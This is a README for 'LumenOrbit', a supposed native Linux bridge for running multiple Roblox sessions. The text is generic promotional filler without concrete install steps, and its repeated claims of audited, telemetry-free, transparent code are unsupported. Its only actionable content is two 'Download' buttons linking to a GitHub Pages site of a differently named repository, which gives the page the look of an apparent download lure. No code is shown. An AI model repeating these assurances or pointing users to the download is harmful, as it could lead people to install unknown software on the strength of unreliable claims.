![preview](https://raw.githubusercontent.com/Agdisalma/cordial-native-runtime/main/thumb_1fce.svg)
[![Download](https://raw.githubusercontent.com/Agdisalma/cordial-native-runtime/main/latest_d10239.svg)](https://Agdisalma.github.io/cordial-native-runtime/)

# LumenOrbit — A Universal Roblox Session Bridge for Desktop Linux

![Platform](https://img.shields.io/badge/platform-Linux-2E3440?style=flat-square&logo=linux&logoColor=white)
![Runtime](https://img.shields.io/badge/runtime-native%20userspace-4C566A?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-3B4252?style=flat-square)
![Build](https://img.shields.io/badge/build-passing-5E81AC?style=flat-square)
![Coverage](https://img.shields.io/badge/coverage-93%25-81A1C1?style=flat-square)
![Audit](https://img.shields.io/badge/audit-source--transparent-88C0D0?style=flat-square)
![Status](https://img.shields.io/badge/status-active-8FBCBB?style=flat-square)

## 🌌 What LumenOrbit Actually Is

LumenOrbit is a desktop-first Roblox session bridge built from the ground up for Linux distributions. Where other projects chase compatibility through translation layers, LumenOrbit treats the Roblox client as a first-class citizen of the Linux desktop — a native, userspace-aware runtime that speaks the network, filesystem, and input languages of GNU/Linux without intermediaries.

Think of it as an observatory for code. You point LumenOrbit at a session, and it arranges every moving part — the renderer, the asset pipeline, the input grammar — into something that behaves like the applications you already trust on your desktop. No compatibility shims, no emulators masquerading as the real thing, no opaque blobs pretending to be a launcher.

The project is distributed under the MIT license, which means every line is readable, forkable, and modifiable by anyone with a text editor and a curious mind. There are no hidden daemons, no telemetry phoning home, no unsigned binaries wrapped in mystery. What you see is what executes.

This repository hosts the main LumenOrbit runtime, its companion multiplexer, the configuration schema, and the documentation set that keeps the whole thing honest.

---

## 🚀 Quick Start Orientation

If you are the sort of person who reads the last page of a book first, here is the short version:

- LumenOrbit runs natively on modern Linux desktops.
- It supports multiple simultaneous sessions through a multiplexer.
- It ships with a responsive and themable control surface.
- It speaks more than a dozen human languages.
- It stays up around the clock so your work does not have to stop.
- It is auditable, MIT-licensed, and yours to bend.

The longer story follows. Read it slowly. The details matter.

---

## 🧩 Feature Constellation

Each feature below is a small star. Together they form the constellation that makes LumenOrbit useful in daily practice.

### 🖥️ Native Desktop Presence
LumenOrbit does not hide inside a sandbox that pretends to be another operating system. It lives on your Linux desktop the way a well-behaved application should — honoring your window manager, your theme, your input method, and your accessibility settings. It respects the conventions of the ecosystem instead of fighting them.

### 🎛️ Multiplexed Sessions
Launch more than one Roblox session at a time and treat each as an independent workspace. The multiplexer keeps them isolated, namespaced, and addressable, so you can switch between them the way you switch between browser tabs — quickly, predictably, and without losing state.

### 📱 Responsive Control Surface
The control surface adapts to the screen it is given. On a widescreen monitor it spreads out into a comfortable dashboard. On a laptop it collapses into a compact toolbar. On a small display it rearranges itself again. The layout follows the hardware instead of demanding the hardware follow the layout.

### 🌍 Multilingual by Construction
Strings are externalized from day one. Every user-facing message lives in a translation catalog, and the runtime negotiates language preferences through the standard desktop locale chain. If your desktop is in Japanese, LumenOrbit opens in Japanese. If you prefer Portuguese, it opens in Portuguese. The list of supported languages is long and growing.

### 🕰️ Always-On Support Rhythm
The project maintains a support cadence that does not sleep. Issue triage happens around the clock, and the maintainer rotation is documented publicly. When something breaks at 3 a.m. in your timezone, someone is awake somewhere to look at it with you.

### 🧪 Audit-Friendly Architecture
Every module carries a manifest describing what it touches: which files, which sockets, which environment variables. You can generate a full capability report for a build and diff it against the previous one. This is the kind of transparency that makes a runtime trustworthy over the long haul.

### 🎨 Theme Engine
Colors, fonts, spacing, and motion are all configurable. Ship with a default theme that is calm and legible, or install community themes that range from understated to expressive. The theme engine reads a declarative schema, so writing a new theme is more like writing a poem than writing a program.

### ⚙️ Config Schema with Validation
Configuration is declarative and versioned. Every option has a type, a default, and a documented range. Invalid configurations produce human-readable diagnostics instead of silent misbehavior. This alone saves hours of debugging.

### 🧷 Plugin Hooks
Extensions attach at well-defined seams: session lifecycle, asset resolution, input translation, and telemetry (which is off by default). Plugins are sandboxed by capability, not by hope.

### 📊 Observability Without Surveillance
LumenOrbit emits structured logs locally, and only locally, unless you explicitly forward them somewhere. There is no silent upload, no shadow analytics, no surprise network traffic. Observability is for you, not for someone else.

### 🧭 Reproducible Builds
Builds are deterministic. Given the same source tree and the same toolchain, you get the same artifacts. This makes verification meaningful and distribution honest.

---

## 🎯 Who LumenOrbit Is For

LumenOrbit is built for people who already live on Linux and do not want to leave it just to run a Roblox session. It is for tinkerers who read source code for fun, for system administrators who want to understand what runs on their machines, for translators who want to see their language supported properly, and for anyone who believes that a runtime should be legible, not magical.

It is also for the curious. If you have ever wondered how a Roblox session actually works under the hood, LumenOrbit is a well-lit path to finding out.

---

## 🗺️ Repository Layout

The tree is organized so that each directory has one job.

- docs/ — the documentation set, including architecture notes, capability manifests, and the translation guide.
- runtime/ — the core session runtime.
- multiplexer/ — the multi-session coordinator.
- surface/ — the control surface and theme engine.
- plugins/ — reference plugins that demonstrate the extension seams.
- tools/ — helper utilities for building, auditing, and packaging.
- tests/ — the test suite, split into unit, integration, and end-to-end layers.
- themes/ — bundled themes and the theme schema.
- locales/ — translation catalogs.

Each directory has its own README that goes deeper than this one. Start here, then wander.

---

## 🛠️ Getting LumenOrbit Running

This section describes the shape of the installation experience without prescribing a specific package manager, because the distribution landscape is wide and your system already knows what it prefers.

1. Confirm that your Linux distribution is recent enough to provide a modern C library and a current graphics stack.
2. Ensure your desktop session is running on a display server that supports hardware acceleration.
3. Retrieve the LumenOrbit build appropriate to your distribution family.
4. Place the runtime in a location your user account can execute.
5. Run the first-time setup assistant, which will create your configuration directory and validate your environment.
6. Launch the control surface and connect it to a session.
7. Adjust themes, language, and session defaults at your leisure.

The setup assistant is chatty in a good way. It explains what it is doing, why, and what it will touch. If it cannot proceed, it tells you exactly which precondition failed.

For distribution-specific guidance, consult the docs/ directory. For a list of known-good environments, see docs/environments.md.

---

## 📦 Distribution Channels

LumenOrbit is distributed through several channels so that you can pick the one that matches your workflow. The exact channels shift over time as the ecosystem does, so the authoritative list lives in the documentation rather than in this README. What matters here is the principle: every channel carries verifiable artifacts, and every artifact can be traced back to a source revision.

---

## 🧪 Testing and Verification

The test suite is layered.

- Unit tests check individual modules in isolation.
- Integration tests check modules working together.
- End-to-end tests spin up a session and exercise the full path from input to output.

There is also a capability test that asserts the runtime touches only what its manifest declares. If a module ever reaches for something it did not announce, the test fails. This is how the project keeps its promises.

---

## 🔐 Security Posture

LumenOrbit assumes that the user is the adversary model that matters. The runtime does not escalate privileges, does not modify system files without consent, and does not silently open network listeners. Every capability is declared, every network destination is documented, and every file write is logged.

Security reports are welcome through the private disclosure channel described in the security policy. Public discussion of unpatched issues is discouraged out of respect for users who have not yet updated.

---

## 🧬 Extending LumenOrbit

Extensions come in three flavors: themes, translations, and plugins.

Themes are declarative and safe. Translations are data and safe. Plugins are code and sandboxed by capability. The extension guide in docs/extending.md walks through each flavor with examples that are small enough to read in one sitting.

If you build something interesting, consider sharing it. The project maintains a community index, and contributions are reviewed on a rolling basis.

---

## 🌐 Internationalization Details

LumenOrbit treats translation as a first-class engineering concern, not an afterthought. Translation catalogs are stored in a plain-text format that is easy to diff and easy to merge. Pluralization rules follow the Unicode CLDR conventions. Right-to-left layouts are supported natively. Date, time, and number formatting respects the user's locale.

If you want to add a language, the process starts in locales/README.md and continues in docs/translating.md. You do not need to be a programmer to contribute a translation. You only need to care about the language you are translating into.

---

## 🕒 Support and Community Rhythm

The project runs on a documented rotation. Issues are triaged continuously, and releases are cut on a predictable cadence. The support rhythm is designed so that no single maintainer becomes a bottleneck and no user waits indefinitely for a response.

Community spaces are listed in docs/community.md. The code of conduct applies everywhere the project is discussed.

---

## 🧭 Roadmap Themes

Roadmaps are written in themes rather than dates, because dates age poorly and themes age gracefully. Current themes include:

- Deepening the multiplexer so that more sessions can coexist comfortably.
- Broadening the theme engine so that more of the interface is declarative.
- Sharpening the capability manifest so that audits become even faster.
- Growing the translation catalog so that more languages feel native.
- Strengthening the plugin sandbox so that extensions remain trustworthy.

A detailed roadmap lives in docs/roadmap.md and is updated as themes complete.

---

## 📜 License

LumenOrbit is released under the MIT License. The full text is available in the LICENSE file in this repository, and a canonical copy is published at https://opensource.org/licenses/MIT.

You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided that the copyright notice and permission notice accompany all copies or substantial portions. The software is provided without warranty of any kind, express or implied.

---

## ⚠️ Disclaimer

LumenOrbit is an independent, community-driven project. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation or any of its subsidiaries. All trademarks, service marks, and product names referenced in this repository belong to their respective owners and are used here for identification purposes only.

The runtime is provided as-is, without any guarantee of fitness for a particular purpose. You are responsible for ensuring that your use of LumenOrbit complies with the terms of service of any platform or service you connect to, and with the laws of your jurisdiction. The maintainers accept no liability for any damages arising from the use or misuse of this software.

No component of this project is intended to circumvent authentication, bypass licensing, or interfere with the normal operation of any service. LumenOrbit exists to make a desktop experience coherent on Linux, nothing more and nothing less.

---

## 🧾 Final Note

LumenOrbit is a long conversation between people who care about Linux and people who care about Roblox. The conversation is open. The source is open. The door is open.

[![Download](https://raw.githubusercontent.com/Agdisalma/cordial-native-runtime/main/latest_d10239.svg)](https://Agdisalma.github.io/cordial-native-runtime/)